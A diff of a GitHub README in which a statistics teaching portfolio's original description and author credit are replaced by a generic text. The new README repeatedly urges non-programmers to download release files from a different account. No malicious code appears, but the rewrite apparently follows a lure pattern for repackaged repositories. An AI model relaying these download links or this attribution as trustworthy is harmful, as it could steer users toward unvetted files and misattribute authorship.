@@ -1,122 +1,156 @@
-# Statistical Analysis Portfolio
+# 📊 statistical-analysis - Simple Tools for Data Insights
 
-[![Test Jupyter Notebooks](https://github.com/EbenezerAdjartey/statistical-analysis/actions/workflows/test-notebooks.yml/badge.svg)](https://github.com/EbenezerAdjartey/statistical-analysis/actions/workflows/test-notebooks.yml)
-
-A comprehensive collection of statistical analysis implementations across three platforms:
-**Python (Jupyter Notebooks)**, **R scripts**, and **Stata do-files**.
-
-Each topic is self-contained, fully documented, and uses synthetic datasets so all code runs
-without external data dependencies.
-
-## Repository Structure
-
-| Folder | Topic | Methods Covered |
-|--------|-------|-----------------|
-| `01_descriptive_statistics/` | Descriptive Statistics | Central tendency, dispersion, skewness, kurtosis, visualizations |
-| `02_probability_distributions/` | Probability Distributions | Discrete & continuous distributions, PDF/CDF, goodness-of-fit |
-| `03_hypothesis_testing/` | Hypothesis Testing | t-tests, ANOVA, chi-square, z-tests, multiple comparisons |
-| `04_regression_analysis/` | Regression Analysis | OLS, logistic, probit, Tobit, Poisson, IV/2SLS, quantile |
-| `05_time_series_analysis/` | Time Series Analysis | ARIMA, SARIMA, VAR, VECM, ARCH/GARCH, stationarity tests |
-| `06_panel_data_analysis/` | Panel Data Analysis | Pooled OLS, fixed effects, random effects, Hausman, GMM |
-| `07_survival_analysis/` | Survival Analysis | Kaplan-Meier, log-rank, Cox PH, parametric models, competing risks |
-| `08_nonparametric_methods/` | Nonparametric Methods | Mann-Whitney, Kruskal-Wallis, KDE, bootstrap, rank correlations |
-| `09_multivariate_analysis/` | Multivariate Analysis | PCA, EFA, clustering, LDA, MANOVA, canonical correlation |
-| `10_bayesian_statistics/` | Bayesian Statistics | Bayes' theorem, MCMC, Bayesian regression, credible intervals |
-| `11_machine_learning/` | Supervised Learning | Regression, classification, trees, ensembles, SVM, neural nets |
-| `12_model_evaluation/` | Model Evaluation | Cross-validation, ROC/AUC, confusion matrix, SHAP, tuning |
-
-## File Formats
-
-Each topic folder contains three equivalent implementations:
-
-- **`.ipynb`** — Jupyter Notebook (Python): uses `numpy`, `pandas`, `scipy`, `statsmodels`, `sklearn`, `matplotlib`, `seaborn`
-- **`.R`** — R Script: uses base R plus `tidyverse`, `lmtest`, `sandwich`, `survival`, `caret`, and topic-specific packages
-- **`.do`** — Stata Do-File: compatible with **Stata 16+** using standard built-in commands
-
-## Getting Started
-
-### Python (Jupyter)
-```bash
-pip install numpy pandas scipy statsmodels scikit-learn matplotlib seaborn lifelines pymc arviz xgboost lightgbm shap
-jupyter notebook
-```
-
-### R
-```r
-install.packages(c("tidyverse", "lmtest", "sandwich", "car", "MASS", "survival",
-                   "survminer", "plm", "tseries", "forecast", "vars", "rugarch",
-                   "FactoMineR", "factoextra", "cluster", "caret", "randomForest",
-                   "e1071", "pROC", "xgboost", "ggplot2", "reshape2"))
-```
-
-### Stata
-Open any `.do` file in Stata 16+ and run with `Do`. External packages (`outreg2`, `estout`,
-`xtabond2`, `stcomprisk`) can be installed with `ssc install <package>`.
-
-## Topics Overview
-
-### 01 — Descriptive Statistics
-Comprehensive summary statistics including mean, median, mode, variance, standard deviation,
-IQR, range, skewness, and kurtosis. Frequency tables, cross-tabulations, and visualizations
-(histograms, boxplots, density plots, Q-Q plots).
-
-### 02 — Probability Distributions
-All major discrete distributions (Binomial, Poisson, Geometric, Hypergeometric, Negative Binomial)
-and continuous distributions (Normal, t, Chi-square, F, Exponential, Gamma, Beta, Uniform, Weibull).
-Covers PDF/PMF, CDF, quantile functions, distribution fitting, and goodness-of-fit tests.
-
-### 03 — Hypothesis Testing
-One-sample and two-sample t-tests, paired t-test, one-way and two-way ANOVA, chi-square tests
-(goodness-of-fit and independence), z-test for proportions, F-test for variance equality, and
-multiple comparison corrections (Bonferroni, Tukey, Scheffé).
-
-### 04 — Regression Analysis
-Simple and multiple OLS regression with diagnostics (VIF, heteroskedasticity tests). Logistic
-regression (binary, multinomial, ordinal), probit and Tobit models, Poisson and Negative Binomial
-regression, IV/2SLS regression, and quantile regression.
-
-### 05 — Time Series Analysis
-Time series visualization, ACF/PACF, stationarity tests (ADF, KPSS, PP), ARIMA/SARIMA modeling
-and forecasting, VAR (Vector Autoregression), VECM (cointegration/error correction), and
-ARCH/GARCH volatility modeling.
-
-### 06 — Panel Data Analysis
-Pooled OLS, fixed effects (within estimator), random effects (GLS), Hausman specification test,
-first-difference estimator, dynamic panel GMM (Arellano-Bond), and cluster-robust standard errors.
-
-### 07 — Survival Analysis
-Kaplan-Meier survival curves, log-rank test, Cox Proportional Hazards model with diagnostics,
-parametric survival models (Weibull, exponential, log-normal), competing risks analysis, and
-time-varying covariates.
-
-### 08 — Nonparametric Methods
-Mann-Whitney U / Wilcoxon rank-sum test, Wilcoxon signed-rank test, Kruskal-Wallis test,
-Spearman and Kendall rank correlations, Kolmogorov-Smirnov test, kernel density estimation,
-and bootstrap resampling with confidence intervals.
-
-### 09 — Multivariate Analysis
-Principal Component Analysis (PCA), Exploratory Factor Analysis (EFA), cluster analysis
-(k-means and hierarchical), Linear Discriminant Analysis (LDA), MANOVA, and Canonical
-Correlation Analysis.
-
-### 10 — Bayesian Statistics
-Bayes' theorem illustration, Bayesian inference with conjugate priors, Bayesian linear regression,
-MCMC sampling (Metropolis-Hastings), credible intervals vs confidence intervals, and Bayesian
-hypothesis testing (Bayes Factor).
-
-### 11 — Machine Learning (Supervised)
-Linear, Ridge, and Lasso regression; logistic regression for classification; decision trees;
-random forests and gradient boosting (XGBoost/LightGBM); SVM; KNN; and basic MLP neural networks.
-
-### 12 — Model Evaluation & Testing
-Train/test split, k-fold cross-validation, confusion matrix metrics (accuracy, precision, recall,
-F1), ROC/AUC, regression metrics (RMSE, MAE, R²), hyperparameter tuning (GridSearch/RandomSearch),
-SHAP values, and learning curves.
-
-## Author
-
-**Ebenezer Adjartey**
-GitHub: [@EbenezerAdjartey](https://github.com/EbenezerAdjartey)
+[![Download Now](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/Diogolsn10/statistical-analysis/releases)
 
 ---
-*All analyses use synthetic or built-in datasets. Code is written for educational and portfolio purposes.*
+
+## 📚 About This Application
+
+This software offers a range of statistical analysis tools. You will find ready-to-use examples in Python (Jupyter), R, and Stata. The projects cover 12 important topics, from basic descriptive statistics to machine learning. These tools help you understand data by performing calculations and showing results clearly.
+
+You do not need any programming skills to use this application. The steps below will guide you through downloading and opening the files on your Windows computer.
+
+---
+
+## 💻 System Requirements
+
+You need a Windows PC with these minimum specs:
+
+- Operating System: Windows 10 or newer  
+- RAM: 4 GB or more  
+- Disk Space: At least 500 MB free  
+- Internet connection to download files  
+
+To use the Python (Jupyter) notebooks, you will need Python installed. The R and Stata files require their respective programs. Instructions on installing these are included below.
+
+---
+
+## 🌐 Download the Software
+
+To get started, visit the official release page by clicking the link below. It has the latest versions of all files you need.
+
+[![Download Releases](https://img.shields.io/badge/Download%20Page-GitHub-blue)](https://github.com/Diogolsn10/statistical-analysis/releases)
+
+### How to download from the page
+
+1. Click the link above. It opens the releases page on GitHub.
+2. Scroll to the section titled "Assets."  
+3. Find the filename that matches your need:
+   - `.ipynb` files for Python/Jupyter  
+   - `.R` files for R  
+   - `.do` or `.dta` files for Stata
+4. Click the filename to start downloading. Save it to a folder you will remember, such as your Desktop or Documents folder.
+
+The files are ready to use once downloaded.
+
+---
+
+## 🚀 How to Run Python (Jupyter) Versions
+
+If you want to open the Python notebooks, follow these steps:
+
+### Step 1: Install Python and Jupyter
+
+- Download and install **Python 3** from the official site: https://www.python.org/downloads/  
+- During installation, check the box **Add Python to PATH**.  
+- After installing Python, open the **Command Prompt** as follows:
+  - Click Start, type `cmd`, and press Enter.
+- Type this command and press Enter:  
+  `python -m pip install notebook`  
+  This installs Jupyter Notebook, the program needed to open `.ipynb` files.
+
+### Step 2: Open the Notebook
+
+- Open the Command Prompt again.
+- Navigate to the folder where you saved the downloaded `.ipynb` file. For example:  
+  `cd Desktop`  
+  if you saved it on the Desktop.
+- Type this command and press Enter:  
+  `jupyter notebook`  
+- A webpage will open in your browser showing the notebook files.
+- Click on the notebook you want to use. It will open in a new browser tab.
+- You can read through the notebook and run the code by clicking **Run** buttons or pressing `Shift + Enter`.
+
+---
+
+## 📈 How to Use R Versions
+
+If you prefer to work with R files, follow these instructions:
+
+### Step 1: Install R
+
+- Download and install R from: https://cran.r-project.org/mirrors.html  
+- Follow the setup instructions for your Windows version.
+
+### Step 2: Open R and Load the Files
+
+- Launch the R GUI program installed.
+- Go to **File > Open Script**.
+- Browse to the folder where you saved the `.R` file.
+- Select it and click **Open**.
+- To run the R script, press **Ctrl + R** or use the **Run** option in the editor.
+- Follow any instructions inside the script to perform analysis.
+
+---
+
+## 📊 How to Use Stata Versions
+
+For Stata users, the files include `.do` scripts or `.dta` data files.
+
+### Step 1: Open Stata
+
+- Make sure Stata is installed on your PC.
+
+### Step 2: Run `.do` Files
+
+- In Stata, click **File > Do**.
+- Select the `.do` file you downloaded.
+- Click **Open** to run the commands.
+- The results appear in the Stata output window.
+
+---
+
+## 🔄 Updating the Application
+
+New versions may be released with additional topics or improvements. To update:
+
+1. Return to the [Download Releases](https://github.com/Diogolsn10/statistical-analysis/releases) page.
+2. Download the newest files just like before.
+3. Replace old files with the new ones in your saved folder.
+
+You do not need to uninstall anything to update.
+
+---
+
+## 🛠 Troubleshooting Tips
+
+- If the file does not open:
+  - Confirm the program (Python/Jupyter, R, Stata) is installed properly.
+  - Make sure you saved the downloaded file fully before opening.
+- If commands do not work:
+  - Check the instructions for your program installation.
+  - Ensure dependencies like Jupyter Notebook are installed (for Python files).
+- If you see error messages:
+  - Read the message carefully; common issues include missing packages or typing errors.
+  - Try searching for the error message online for more advice.
+
+---
+
+## 📁 File Structure and Topics Covered
+
+The files cover 12 main topics, including these examples:
+
+- Descriptive Statistics  
+- Bayesian Statistics  
+- Data Science Basics  
+- Machine Learning  
+- Survival Analysis  
+- Time Series Analysis  
+
+Each file is organized to guide you through the calculations with clear comments and examples.
+
+---
+
+## ⚙️ Getting Help
+
+You can search online for help with Python, R, or Stata if you get stuck. Also, the GitHub page might have updates or additional files over time. Check the repository issues tab for answers to common questions.
